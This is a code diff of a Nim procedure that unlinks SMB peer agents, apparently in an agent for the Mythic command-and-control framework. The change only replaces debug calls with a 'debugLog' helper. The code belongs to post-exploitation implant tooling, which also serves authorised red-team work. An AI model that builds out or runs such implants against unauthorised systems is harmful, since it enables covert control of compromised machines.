@@ -39,7 +39,7 @@ proc handleUnlink*(taskId: string, params: JsonNode): JsonNode =
           break
 
     if conn == nil:
-      debug &"[DEBUG] Unlink: Looking for {agentUuid}, active connections:"
+      debugLog "unlink", &"Unlink: Looking for {agentUuid}, active connections:"
       for key, c in activeLinkConnections:
         debug &"  - key={key} agentUuid={c.agentUuid} active={c.active}"
       return mythicError(taskId, &"No active link connection for agent {agentUuid}")
@@ -47,7 +47,7 @@ proc handleUnlink*(taskId: string, params: JsonNode): JsonNode =
     if not conn.active and conn.receivedEof:
       return mythicError(taskId, &"Connection to {agentUuid} is already closed")
 
-    debug &"[DEBUG] Unlink: Unlinking from SMB agent {agentUuid}"
+    debugLog "unlink", &"Unlink: Unlinking from SMB agent {agentUuid}"
 
     # Signal the connection to stop
     conn.active = false
@@ -66,10 +66,10 @@ proc handleUnlink*(taskId: string, params: JsonNode): JsonNode =
     # Mark as received EOF so the check loop will send edge removal
     conn.receivedEof = true
 
-    debug &"[DEBUG] Unlink: Successfully initiated unlink from {agentUuid}"
+    debugLog "unlink", &"Unlink: Successfully initiated unlink from {agentUuid}"
 
     return mythicSuccess(taskId, &"Unlinked from SMB agent {agentUuid}")
 
   except Exception as e:
-    debug &"[DEBUG] Unlink error: {e.msg}"
+    debugLog "unlink", &"Unlink error: {e.msg}"
     return mythicError(taskId, &"Failed to unlink: {e.msg}")
